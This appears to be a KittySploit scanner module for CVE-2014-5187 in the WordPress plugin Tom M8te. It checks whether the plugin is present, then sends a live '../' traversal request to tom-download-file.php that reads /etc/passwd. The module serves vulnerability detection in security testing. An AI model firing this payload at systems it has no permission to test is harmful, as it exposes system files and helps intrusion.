#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Directory traversal vulnerability in the Tom M8te (tom-m8te) plugin 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Tom M8te (tom-m8te) Plugin 1.5.3 - Directory Traversal Detection',
        'description': 'Directory traversal vulnerability in the Tom M8te (tom-m8te) plugin 1.5.3 for WordPress allows remote attackers to read arbitrary files via the file parameter to tom-download-file.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'wpscan', 'cve', 'cve2014', 'wp-cross-rss', 'wordpress', 'wp-plugin', 'lfi', 'wp', 'tom-m8te', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/3095c3f3-9cdc-49f8-8478-c2922f0a442a/',
            'https://codevigilant.com/disclosure/wp-plugin-tom-m8te-local-file-inclusion/',
        ],
        'cve': 'CVE-2014-5187',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('/wp-content/plugins/tom-m8te/',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/tom-m8te/tom-download-file.php?file=../../../../../../../etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='medium', reason='Tom M8te (tom-m8te) Plugin 1.5.3 - Directory Traversal detected', path=path)
            return True
        return False

